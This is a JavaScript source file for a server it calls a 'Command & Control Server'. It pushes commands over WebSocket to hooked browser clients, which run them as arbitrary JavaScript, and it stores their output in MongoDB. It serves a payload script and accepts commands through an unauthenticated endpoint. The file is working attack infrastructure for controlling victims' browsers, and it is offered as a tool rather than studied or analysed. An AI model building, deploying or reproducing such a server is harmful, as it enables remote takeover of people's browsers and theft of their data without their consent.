/**
 * Shadow Console - Command & Control Server
 * =======================================
 * This server manages WebSocket connections from browser clients and handles
 * command distribution and execution tracking.
 *
 * Core Components:
 * --------------
 * 1. Express HTTP Server
 *    - Serves static files (payload script, control panel)
 *    - Handles command submissions via REST API
 *
 * 2. WebSocket Server
 *    - Maintains persistent connections with browser clients
 *    - Broadcasts commands to connected browsers
 *    - Receives and processes execution results
 *
 * 3. MongoDB Integration
 *    - Stores command history
 *    - Tracks execution status across clients
 *
 * API Endpoints:
 * -------------
 * POST /command
 *   - Accepts new commands to execute
 *   - Broadcasts to all connected clients
 *   - Returns success/failure status
 *
 * WebSocket Messages:
 * -----------------
 * Outgoing: { command: string, _id: string, executed: boolean }
 * Incoming: { type: 'execution_complete', id: string, result: string }
 *
 * Security Note:
 * -------------
 * This server can execute arbitrary JavaScript in connected browsers.
 * Use only in controlled environments with proper authorization.
 */

import express from "express";
import mongoose from "mongoose";
import cors from "cors";
import "dotenv/config";
import { WebSocketServer } from "ws";
import { createServer } from "http";

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static("public"));

// Create HTTP server
const server = createServer(app);

// Create WebSocket server
const wss = new WebSocketServer({ server });

// Store connected clients
const clients = new Set();

// MongoDB Schema
const commandSchema = new mongoose.Schema({
  command: String,
  executed: { type: Boolean, default: false },
  timestamp: { type: Date, default: Date.now },
  output: String,
});

const Command = mongoose.model("Command", commandSchema);

// MongoDB connection
mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));

// WebSocket connection handler
wss.on("connection", (ws) => {
  console.log("New client connected");
  clients.add(ws);

  ws.on("message", async (message) => {
    try {
      const data = JSON.parse(message);
      if (data.type === "execution_complete") {
        const command = await Command.findById(data.id);
        if (command) {
          command.executed = true;
          command.output = data.result;
          await command.save();
        }
      }
    } catch (error) {
      console.error("Error processing WebSocket message:", error);
    }
  });

  ws.on("close", () => {
    console.log("Client disconnected");
    clients.delete(ws);
  });
});

// HTTP endpoint to receive commands
app.post("/command", async (req, res) => {
  try {
    const command = new Command({
      command: req.body.command,
    });
    await command.save();

    // Broadcast command to all connected clients
    const commandData = command.toObject();
    clients.forEach((client) => {
      if (client.readyState === 1) {
        // 1 = OPEN
        client.send(JSON.stringify(commandData));
      }
    });

    res.status(201).json({ message: "Command saved successfully" });
  } catch (error) {
    res.status(500).json({ error: "Error saving command" });
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
